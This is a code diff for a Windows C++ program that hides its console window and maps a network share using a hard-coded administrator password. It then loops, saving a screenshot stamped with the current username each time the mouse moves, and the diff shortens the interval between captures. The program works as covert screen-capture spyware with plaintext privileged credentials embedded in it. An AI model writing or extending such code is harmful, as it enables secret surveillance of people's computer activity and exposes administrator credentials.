@@ -8,11 +8,11 @@
 #include <windows.h>
 #include <Lmcons.h>
 using namespace std;
-int mouse2 = 0;
 static TCHAR szBuffer[MAX_COMPUTERNAME_LENGTH + 1];
 static DWORD dwSize = MAX_COMPUTERNAME_LENGTH + 1;
 static TCHAR username[UNLEN + 1];
 static DWORD username_len = UNLEN + 1;
+
 CString GetTime() {
 	GetComputerName(szBuffer, &dwSize);
 	GetUserName(username, &username_len);
@@ -36,6 +36,7 @@ CString GetTime() {
 	if (_mkdir(CFoldername) == 0);
 	return totalename;
 }
+
 void ScreenShot(LPCTSTR s)
 {
 	POINT pt;
@@ -55,34 +56,34 @@ void ScreenShot(LPCTSTR s)
 	HICON hIcon;
 	hIcon = (HICON)LoadImage(NULL, L"C:\\Windows\\Cursors\\aero_arrow_l.cur", IMAGE_ICON, 0, 0, LR_LOADFROMFILE | LR_DEFAULTSIZE | LR_SHARED);
 	DrawIcon(hdcMem, pt.x, pt.y, hIcon);
+	GetUserName(username, &username_len);
+	CString UserName = username;
+	RECT textlocation = { 0, 1020, 1920, 1080 };
+	DrawText(hdcMem, UserName, -1, &textlocation, DT_BOTTOM);
 	BitBlt(image.GetDC(), 0, 0, width, heigth, hdcMem, 0, 0, SRCCOPY);
 	DeleteDC(hdc);
 	DeleteDC(hdcMem);
 	DeleteObject(hbitmap);
-	ReleaseDC(NULL, hdcMem);
+	ReleaseDC(hwnd, hdcMem);
 	image.ReleaseDC();
 	image.Save(s, Gdiplus::ImageFormatJPEG);
 }
-int Xmouseposition() {
+
+int mouseposition() {
 	POINT pt;
 	BOOL bReturn = GetCursorPos(&pt);
-	int x = pt.x;
-	return x;
+	int x = pt.x, y = pt.y;
+	return x + y;
 }
-int Ymouseposition() {
-	POINT pt;
-	BOOL bReturn = GetCursorPos(&pt);
-	int y = pt.y;
-	return y;
-}
+
 int main()
 {
 	ShowWindow(GetConsoleWindow(), SW_HIDE);
 	system("NET USE \\\\10.224.22.219 /user:fileserver19\\administrator !qaz2wsx");
+	int mouse2 = NULL;
 	while (true)
 	{
-		int Xmouse1 = Xmouseposition(), Ymouse1 = Ymouseposition();
-		int mouse1 = Xmouse1 + Ymouse1;
+		int Xmouse1 = mouseposition(), mouse1 = Xmouse1;
 		if (mouse1 == mouse2)
 		{
 		}
@@ -92,6 +93,6 @@ int main()
 			ScreenShot((LPCTSTR)(CString)totalename);
 			mouse2 = mouse1;
 		}
-		Sleep(2000);
+		Sleep(1000);
 	}
 }
